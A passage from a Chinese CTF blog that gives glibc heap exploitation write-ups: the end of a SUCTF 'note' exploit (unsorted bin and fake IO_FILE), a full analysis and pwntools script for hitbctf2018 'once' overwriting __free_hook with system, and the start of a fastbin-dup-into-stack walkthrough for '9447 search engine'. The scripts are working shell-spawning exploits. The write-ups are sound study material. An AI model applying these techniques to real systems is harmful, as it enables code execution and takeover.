class="line">	p = process(<span class="string">'./note'</span>)</span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">"b _IO_str_overflow"</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	libc = ELF(<span class="string">'./libc6_2.24-12ubuntu1_amd64.so'</span>)</span><br><span class="line">	p = remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20003</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'(yes:1)'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,<span class="string">'1'</span>*<span class="number">16</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak system address</span></span><br><span class="line">dele()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">offset =  <span class="number">0x7f1b15e2ab78</span><span class="number">-0x7f1b15a66000</span></span><br><span class="line">libc_base = libc_addr - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">binsh_addr = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))+<span class="number">5</span></span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack </span></span><br><span class="line">fake_chunk = p64(<span class="number">0x8002</span>)+p64(<span class="number">0x61</span>) <span class="comment">#header</span></span><br><span class="line">fake_chunk += p64(<span class="number">0xddaa</span>)+p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake IO_FILE_PLUS</span></span><br><span class="line">fake_IFP = p64(<span class="number">0x2</span>)+p64(<span class="number">0xffffffffffffff</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64((binsh_addr<span class="number">-0x64</span>)/<span class="number">2</span>)</span><br><span class="line">fake_IFP = fake_IFP.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_IFP += p64(sys_addr+<span class="number">0x420</span>)</span><br><span class="line">fake_IFP = fake_IFP.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vtable_addr = malloc_hook<span class="number">-0x1370</span><span class="comment">#+libc.symbols['_IO_str_jumps']</span></span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line">fake_IFP += p64(vtable_addr)</span><br><span class="line">fake_IFP += p64(sys_addr)</span><br><span class="line">fake_IFP += p64(<span class="number">2</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">3</span>) </span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)*<span class="number">3</span> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">16</span> +fake_chunk+fake_IFP</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,payload)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#add a large chunk</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/06/05/hitbctf2018-once/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/05/hitbctf2018-once/" itemprop="url">hitbctf2018-once</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-05T23:30:28+08:00">
                2018-06-05
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/06/05/hitbctf2018-once/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/06/05/hitbctf2018-once/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/06/05/hitbctf2018-once/" class="leancloud_visitors" data-flag-title="hitbctf2018-once">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,027字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="once"><a href="#once" class="headerlink" title="once"></a>once</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p><em>once名字的来由大概是很多操作都只能做一次（误）</em></p>
<p>先执行二进制文件，根据输出的字符串定位各个函数。</p>
<p><strong>f1</strong>：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的<code>&amp;unk_202020</code>，其中<code>unk_202020[3]</code>为<code>off_202038</code>。新加入的结点插入到头部，用<code>off_202038</code>进行记录。这个逻辑我还是想了一会的，果然要多读源码。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f1.png" alt="f1函数"></p>
<p><strong>f2：</strong>在bss段有一个变量<code>dword_202064</code>，作为是否进行了写操作的标志。函数实现了向第一个结点内写入0x20个字节，这个功能仅能实现一次。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f2.png" alt="f2函数"></p>
<p><strong>f3：</strong>同样，bss有一个<code>dword_202060</code>变量，标识是否进行了结点删除的操作。函数实现了删除第一个结点。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f3.png" alt="f3函数"></p>
<p><strong>f4：</strong>函数里有一些子操作，输入1时，分配size大小的内存空间，并把对应标志置位。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f41.png" alt="f4-1"></p>
<p>​    输入2时，向ptr内输入size大小的内容。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f42.png" alt="f4-2"></p>
<p>​    输入3时，释放ptr内存。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f43.png" alt="f4-3"></p>
<h2 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h2><p>在f2里，用户可以输入0x20个字节，能够覆盖掉结点中的前后向指针。并且在f3的解链操作中，对前后向指针进行操作，能够将程序劫持到期待的位置。简称<code>offset_202038</code>为<code>first``,unk_202020</code>为<code>head</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   			<span class="comment">//f2向结点内写内容，覆盖node[3]的地址为addr</span></span><br><span class="line"><span class="comment">//first里记录的是node的地址</span></span><br><span class="line">first = *(first+<span class="number">3</span>)</span><br><span class="line"><span class="comment">//first = addr                        </span></span><br><span class="line">   			*(first+<span class="number">2</span>)=&amp;head</span><br><span class="line">   			<span class="comment">//*(addr+2)=&amp;head</span></span><br></pre></td></tr></table></figure>
<p>可以看出，最终能够实现向<code>addr+16</code>的地址处写入head地址。由于f4后续可以操作ptr变量，就使得<code>addr+16=&amp;ptr</code>，经过上述过程后，ptr的内容为head地址，那么后面就可以向data段和bss段任意写。</p>
<p>本题开启了PIE保护，也就是无法直接获取到GOT，BSS变量地址。实际上，二进制文件中的相对位置是不变的。由于.data段与.bss段相邻，且相差较少，可以通过修改最后一个个字节来修改node[3]的内容。<code>addr = &amp;ptr-16 = 0x202058</code>，发送最后一个字节0x58即可。</p>
<p><img src="/2018/06/05/hitbctf2018-once/1.png" alt=""></p>
<p><img src="/2018/06/05/hitbctf2018-once/2.png" alt="data段和bss段地址"></p>
<p>之后f4向ptr写入内容就相当于向<code>unk_202020</code>起始的位置写入内容。由于f2能够向<code>off_202038</code>中的地址写入内容，不妨将offset_202038的值写为 <code>__free_hook</code>的地址，之后调用f2就可以向这里写入<code>system</code>地址。为了再次利用f2函数，应该覆写位于bss中的dword_202064变量。这样，覆写了 <code>__free_hook</code>之后，再次调用free就会执行<code>system</code>，f4中的3调用了<code>free</code>函数，对ptr中地址进行释放，因此可以将ptr中的值覆写为<code>/bin/sh</code>的地址。</p>
<p>一共要进行三次写操作：</p>
<p>1.f2向<code>offset_202038</code>中写入24字节填充和1字节0x58覆盖后向指针</p>
<p>2.f4-2向ptr中写入<code>__free_hook</code>地址、<code>/bin/sh</code>地址和对一些标识位置位。</p>
<p>3.f2向<code>offset_202038</code>（<code>__free_hook</code>）写入<code>system</code>地址</p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./once'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./once'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'47.75.189.102'</span>, <span class="number">9999</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_1</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_2</span><span class="params">(string)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(string)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_3</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Invalid choice\n'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#add a node</span></span><br><span class="line">fun_1()</span><br><span class="line"><span class="comment">#f4:ptr=malloc 0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="comment">#input node </span></span><br><span class="line">fun_2(<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">8</span> + chr(<span class="number">0x58</span>))</span><br><span class="line"><span class="comment">#remove node</span></span><br><span class="line">fun_3()</span><br><span class="line"><span class="comment">#write ptr</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+ <span class="string">'\0'</span>*<span class="number">0x10</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]) + p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] )+ p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) +p64(<span class="number">0</span>)*<span class="number">4</span> )</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/06/05/fastbin-attack-search/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/05/fastbin-attack-search/" itemprop="url">fastbin_attack-search</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-05T23:26:06+08:00">
                2018-06-05
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/06/05/fastbin-attack-search/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/06/05/fastbin-attack-search/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/06/05/fastbin-attack-search/" class="leancloud_visitors" data-flag-title="fastbin_attack-search">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2,093字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="fastbin-劫持"><a href="#fastbin-劫持" class="headerlink" title="fastbin 劫持"></a>fastbin 劫持</h1><p>最近在看GitHub上的<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a> ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。</p>
<p>在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回地址，执行shell。</p>
<p>[TOC]</p>
<h2 id="fastbin劫持的原理"><a href="#fastbin劫持的原理" class="headerlink" title="fastbin劫持的原理"></a>fastbin劫持的原理</h2><p>fastbin劫持的原理是，在双重释放之后，fastbin上会有两个相同的chunk，当其中一个chunk被分配并能够进行写操作时，另一个留在fastbin链表里的chunk对应的内容也会发生改变，通过覆写FD指针，将链表中的下一个结点指向我们可以操控的地方。需要注意的是，fastbin再分配之前会先检查当前这个chunk的大小是否与申请的大小一致，因此伪造的fastbin chunk的size字段必须满足条件。</p>
<p><img src="/2018/06/05/fastbin-attack-search/fastbin_1.png" alt=""></p>
<p><img src="/2018/06/05/fastbin-attack-search/fastbin_2.png" alt="fastbin attack"></p>
<p>了解了原理之后再看search engine这道题。</p>
<h2 id="search-engine"><a href="#search-engine" class="headerlink" title="search engine"></a>search engine</h2><h3 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>一个简单的搜索引擎，index  a  sentence输入一个句子，单词用空格作为分隔，每个单词放入一个结点中，记录单词的地址、大小以及所在句子的地址、大小，最后一个字段记录下一个结点的地址。单词链表类似于一个栈的结构，最后分隔的单词在链表的最顶端。一个node结点占40字节。</p>
<p><img src="/2018/06/05/fastbin-attack-search/menu.png" alt="menu"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> * word;         <span class="comment">//8 bytes</span></span><br><span class="line">    <span class="keyword">int</span> word_size;       <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">int</span> word_padding;    <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">char</span> * sentence;     <span class="comment">//8 bytes</span></span><br><span class="line">    <span class="keyword">int</span> sentence_size;   <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">int</span> sentence_padding;<span class="comment">//4 bytes</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">next</span>;</span>		 <span class="comment">//8 bytes</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>search with a word输入一个单词，从链表的头部开始查找相同单词，找到之后将对应的sentence置为0，并free sentence指针所指空间。</p>
<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>本题共有两个漏洞：</p>
<p>第二个漏洞我确实没看出来，大概是不细心&amp;平时我也是这么写的= =</p>
<ul>
<li>释放sentence之后对应指针没有置零，UAF漏洞和double-free漏洞。</li>
</ul>
<ul>
<li><p>input_num函数可以泄露栈中的内容。strtol函数的第二个参数endptr返回的是字符串中不能转换为数字的地址，当输入的首个字符就不能转换为数字时，即&amp;nptr == endptr，input_num就会将输入的字符串打印出来。当输入的字符数量为48时，input_str不会向结尾加入NULL，由此可以读出字符串之后栈中的内容。</p>
<p>​</p>
</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了以上两个漏洞，再结合fastbin_dup_into_stack.c来看，我们需要<strong>泄露栈中地址</strong>，<strong>泄露libc地址</strong>（进而泄露system地址），将<strong>system函数写入栈中的返回地址处</strong>，执行system函数。</p>
<p><strong>泄露栈地址</strong>（这个真的不是玄学吗？？）</p>
<p>input_num函数是递归调用的，第一次输入48个字节后面没有其他东西，但是继续输入48个字节就有机会泄露栈中内容，即通过向上增长栈寻找可泄露的地址。</p>
<p><img src="/2018/06/05/fastbin-attack-search/leak_stack.png" alt="两次输入48字节"></p>
<p>通过多次gdb的调试，发现泄露的内容是一个栈地址，但是<em>我到现在还是不太明白，为什么这个栈地址加上某一偏移的地址其值能一直保持不变化</em>。这里打一个问号。看别人的题解说，这里距离返回地址的位置比较近，可以确定的是，调用index sentence和 search word函数的返回地址都是0x400d60- 0x400e24范围内的，且压入返回地址的位置永恒不变，可以确定通过泄露的栈地址计算返回地址的栈地址，但是如何定位到含有“0x40”的地址，还没有搞清楚。</p>
<p><img src="/2018/06/05/fastbin-attack-search/leak_stack_2.png" alt=""></p>
<p><strong>泄露libc地址</strong></p>
<p>UAF漏洞可以达到这个目的。试想如果sentence（简称s1）的大小与一个node一样，都是40 bytes，那么当释放s1空间后，再输入一个新的sentence（简称s2，保证大小不是32-40字节，防止将刚释放的s1分配给它），这时会建立一个新的node（简称n2）存放word信息，就会将刚释放的s1的空间分配给n2，而且也能保证s1空间不再为NULL，绕过了对内容是否为空的检查：*（node + 16）！=NULL。</p>
<p>由于s1释放之后没有把指针置空，导致原来的node的word和sentence指针仍指向原来的位置，通过search并删除s1，使 n2 引用的是已释放的空间。</p>
<p>继续把已经释放的s1分配给新的sentence（简称s3），并通过向s3里写内容，伪造一个假的node结点，使其中sentence指针指向puts@got，这样在search成功之后，就会输出puts@got中的puts地址，从而泄露libc地址。</p>
<p><strong>system函数覆盖栈中返回地址</strong></p>
<p>按照其他大佬的思路，在泄露的栈地址之后找到了0x40用于表示chunk_size的地址，且距离返回地址较近，接下来就可以通过fastbin劫持将fastbin链表结点指向这个栈中地址。</p>
<p>为了配合0x40这个大小，可以新建两个0x40长度的sentence a和b，按照程序逻辑b对应的node结点将会在word链表的顶端。</p>
<p>然后通过search删除它们，fastbin中的结构如下: fastbin -&gt; a-&gt;b-&gt;NULL，由于node中的指针并没有置零，因此search的时候还会去检查已经释放的a和b空间是否符合条件。</p>
<p>search（’\x00’），先从word的顶端b对应的node开始检查，由于b中的FD指针为NULL，它不能通过<em>（node + 16）！=NULL 的检测，接着来到a对应的node，即使node能够满足条件，但是<em>*由于a是fastbin中的第一个chunk，释放它将会引发错误。</em></em>因此我们可以在最开始时候新建3个sentence a,b,c。这样fastbin中就是：fastbin -&gt;a -&gt;b -&gt; c -&gt; NULL ，然后再search(‘\00’)，删除掉b保留a，达到双重释放的目的，fastbin结构变成：fastbin -&gt;b -&gt;a -&gt;b -&gt;……</p>
<p>释放之后，再申请相同大小的sentence导致b空间被分配，并通过改写b从而改掉处于fastbin中b的FD指针，使其指向栈中假的chunk。</p>
<p>接着把剩余的a和b再分配出去，再申请sentence将会返回栈中的假chunk，以写sentence的内容覆写返回地址。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>（栈中偏移地址部分参考了其他<a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/" target="_blank" rel="noopener">大佬</a>的数据，整体思路也是顺着这位大佬来的）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span 